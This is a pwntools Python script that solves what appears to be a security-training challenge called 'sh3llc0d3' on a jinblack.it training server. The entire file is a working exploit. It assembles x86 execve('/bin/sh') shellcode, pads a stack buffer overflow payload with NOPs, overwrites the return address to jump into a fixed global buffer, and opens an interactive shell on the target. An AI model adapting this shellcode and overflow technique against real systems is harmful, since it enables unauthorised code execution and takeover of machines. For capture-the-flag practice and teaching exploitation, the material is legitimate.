"""
ncat bin.training.jinblack.it 2002
"""

import sys
from pwn import *
from pwn import p32

if "--remote" in sys.argv:
    p = remote("bin.training.jinblack.it", 2002)
else:
    p = process("./sh3llc0d3")

if "--debug" in sys.argv:
    context.terminal = ["terminator", "-e"]
    gdb.attach(p, """
    b *0x0804926b
    """)

shellcode = asm("""
xor eax, eax
mov al, 0xb
xor ebx, ebx
mov ebx, 0x0804c060
mov [ebx + 7], ah
xor ecx, ecx
xor edx, edx
int 0x80
""", arch='x86')

print(shellcode)

payload = b"/bin/sh\x90"
payload += shellcode
payload = payload.ljust(208 + 4, b"\x90")
payload += p32(0x0804c060 + 8)
payload = payload.ljust(1000, b"\x90")

p.recvuntil(b"What is your name?\n")
p.sendline(payload)
p.interactive()
